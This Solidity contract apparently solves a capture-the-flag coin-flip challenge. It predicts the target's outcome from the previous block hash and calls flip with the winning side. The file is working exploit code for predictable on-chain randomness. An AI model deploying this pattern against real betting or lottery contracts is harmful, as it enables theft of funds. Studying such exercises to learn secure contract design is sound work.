// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "../interfaces/ICoinFlip.sol";

contract CoinFlipExploit {
    ICoinFlip coinFlip;
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(ICoinFlip _coinFlip) {
        coinFlip = _coinFlip;
    }

    function flipToWin() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            return;
        }
        bool winningSide = predictWinningSide();
        coinFlip.flip(winningSide);
    }

    function predictWinningSide() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlipValue = blockValue / FACTOR;
        bool side = coinFlipValue == 1 ? true : false;

        return side;
    }
}
